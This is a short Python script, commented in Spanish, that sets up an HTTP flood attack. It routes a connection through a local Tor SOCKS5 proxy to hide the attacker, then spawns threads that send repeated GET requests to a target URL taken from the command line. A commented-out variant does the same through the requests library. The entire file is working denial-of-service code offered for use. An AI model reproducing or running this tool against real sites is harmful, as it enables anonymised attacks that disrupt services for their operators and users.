# pip3 install pysocks

import sys
import threading
import requests
import socks
import socket
import re

# Variables globales que indican los parametros a usar
cantidad_hilos = 1
cantidad_repeticiones = 10
url = None

puerto = 80

# Lista de hilos que habran trabajando.
hilos = []

# Funcion que se encarga de manejar los parametros que vienen desde la terminal.
# Los chequea e informa si hay un error.
def manejar_parametros():
    for i in range(len(sys.argv)):

        if sys.argv[i] == "-u":
            try:
                global url
                url = sys.argv[i+1]
            except:
                print("No ha ingresado un URL, no se puede llevar a cabo el ataque.")
                sys.exit()

        elif  sys.argv[i] == "-n":

            try:
                global cantidad_hilos
                cantidad_hilos = int(sys.argv[i+1])
            except Exception:
                print("No ha ingresado una cantidad de hilos correcta, se usaran %2d hilos." %(cantidad_hilos))

        elif sys.argv[i] == "-r":
            try:
                global cantidad_repeticiones
                cantidad_repeticiones = int(sys.argv[i+1])
            except Exception:
                print("No ha ingresado una cantidad de repeticiones correcta, se usaran %2d hilos." %(cantidad_repeticiones))


    print("Cantidad de hilos: ", cantidad_hilos )
    print("Cantidad de repeticiones: ", cantidad_repeticiones )
    print("URL: ", str(url) )


# Esta funcion perpetra el ataque y es asociada con cada hilo, por lo que cada hijo ejecuta esta funcion.
def ataque(id, client):



    mensaje = "GET / HTTP/1.1\r\nHost: " + url + "\r\n\r\n"

    for i in range(cantidad_repeticiones):

        client.sendall(mensaje.encode('utf-8'))
        print("Hilo %10d solicitando por %10d vez." % (id+1, i+1))


    # Este codig sirve, solo que no con coneccion por sockets y protocolo TCP, usa requests de python
    """
    session = requests.session()
    session.proxies = {}
    session.proxies['http'] = 'socks5h://localhost:9050'
    session.proxies['https'] = 'socks5h://localhost:9050'

    for i in range(cantidad_repeticiones):
        r = session.get(url)


        # Aca se puede imprimir lo que se desee de la pagina, en este caso, indicamos
        # cual hilo esta atacando por cual vez.
        print("Hilo %10d solicitando por %10d vez." % (id+1, i+1))
    """




# Funcion que inserta en la variable global hilos cada hilo con su respectivo objetivo.
def crear_hilos(client):
    global hilos
    for i in range(cantidad_hilos):

        h = threading.Thread(target = ataque, args = (i,client,))
        hilos.append(h)

# Funcion que aplica .start() cada hilo de la lista.
def iniciar_ataque():
    global hilos

    for i in range(len(hilos)):
        hilos[i].start()

if __name__ == '__main__':


    # Setea el proxy que se va a usar.
    # Este es por el cual se conecta TOR.
    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
    client = socks.socksocket()

    manejar_parametros()


    try:
        client.connect((url,puerto))
    except Exception as e:
        print (str(e))
        sys.exit()

    crear_hilos(client)
    iniciar_ataque()
